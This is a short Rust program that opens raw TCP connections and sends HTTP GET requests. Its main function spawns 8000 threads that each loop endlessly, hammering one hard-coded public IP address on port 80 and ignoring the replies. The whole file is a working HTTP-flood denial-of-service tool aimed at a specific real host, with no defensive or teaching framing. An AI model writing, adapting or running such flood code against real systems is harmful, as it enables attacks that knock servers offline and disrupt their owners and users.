use std::io::{Read, Write};
use std::net::TcpStream;
use std::io;
use std::thread;


fn send_http_get_request(host: &str, port: u16, path: &str) -> std::io::Result<String> {
    let mut stream: TcpStream = TcpStream::connect(format!("{}:{}", host, port))?;
    let request: String = format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", path, host);
    stream.write_all(request.as_bytes())?;
    let mut buffer: Vec<u8> = Vec::new();
    stream.read_to_end(&mut buffer).map_err(|e: std::io::Error| std::io::Error::new(std::io::ErrorKind::Other, e))?;
    let response_str: String = String::from_utf8(buffer).map_err(|e: std::string::FromUtf8Error| std::io::Error::new(std::io::ErrorKind::Other, e))?;
    Ok(response_str)
}


fn main() -> io::Result<()> {
    let host: &str = "37.187.56.77";
    let port: u16 = 80;
    let path: &str = "/";
    let numthreads: i32 = 8000;
    let handles: Vec<_> = (0..numthreads).map(|i: i32| {
        thread::spawn(move || {
            loop {
                println!("{}", i);
                let _ = send_http_get_request(host, port, path);
                
            }
        })
    }).collect();

    for handle in handles {
        handle.join().unwrap();
    }

    Ok(())
}